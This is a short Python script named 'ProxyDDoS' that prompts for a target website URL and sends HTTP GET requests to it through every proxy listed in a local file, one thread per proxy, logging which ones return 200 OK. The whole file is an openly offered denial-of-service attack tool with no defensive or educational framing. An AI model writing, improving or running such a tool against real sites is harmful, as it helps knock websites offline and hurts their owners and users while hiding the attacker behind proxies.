import socket
import requests
import threading
from pystyle import Anime, Colors, Colorate
import sys

sys.stdout.write("\x1b]2;ProxyDDoS\x07")


class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    PURPLE = '\033[0;35m'
    PURPLE2 = '\033[1;35m'

def startlogo():
    logo="""
    
██████╗ ██╗   ██╗██████╗ ██████╗ ██████╗ 
██╔══██╗██║   ██║██╔══██╗╚════██╗██╔══██╗
██████╔╝██║   ██║██║  ██║ █████╔╝██████╔╝
██╔══██╗██║   ██║██║  ██║ ╚═══██╗██╔═══╝ 
██║  ██║╚██████╔╝██████╔╝██████╔╝██║     
╚═╝  ╚═╝ ╚═════╝ ╚═════╝ ╚═════╝ ╚═╝     
        Github: https://github.com/Rud3p

[$] Start System...
"""
    Anime.Fade((logo), Colors.blue_to_purple, Colorate.Vertical, time=3)

def send_http_get_request_socket(proxy, host, port, path, success_urls, lock):
    try:
        client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        proxy_host, proxy_port = proxy.split(':')
        client_socket.connect((proxy_host, int(proxy_port)))

        request = f"GET {path} HTTP/1.1\r\nHost: {host}\r\n\r\n"
        client_socket.send(request.encode())

        response = b""
        while True:
            data = client_socket.recv(1024)
            if not data:
                break
            response += data

        if b"HTTP/1.1 200 OK" in response:
            with lock:
                success_urls.append(f"http://{host}:{port}{path}")  # Store successful URLs
        print(f"Proxy: {proxy}, Host: {host}:{port}, Path: {path} - Status: 200 OK")

        client_socket.close()
    except Exception as e:
        print(f"Proxy: {proxy}, Host: {host}:{port}, Path: {path} - Error: {e}")

with open('proxys.txt', 'r') as file:
    proxies_list = [line.strip() for line in file]

def setup():

    target_url = input(f"{bcolors.PURPLE2}[$] Enter the target website URL: {bcolors.ENDC}")

    url_parts = requests.utils.urlparse(target_url)
    host = url_parts.netloc
    port = 80 if not url_parts.port else url_parts.port
    path = url_parts.path if url_parts.path else "/"

    num_threads = len(proxies_list)  

    threads = []
    success_urls = []  #
    lock = threading.Lock()  

    for i in range(num_threads):
        proxy = proxies_list[i % len(proxies_list)]  
        thread = threading.Thread(target=send_http_get_request_socket, args=(proxy, host, port, path, success_urls, lock))
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()

    if success_urls:
        print("Successful URLs (Status Code 200):")
        for url in success_urls:
            print(url)
        print(f"Total URLs with Status Code 200: {len(success_urls)}")
    else:
        print("No URLs returned a 200 status code.")

    print("All threads have finished.")

def startup():
    startlogo()
    setup()
startup()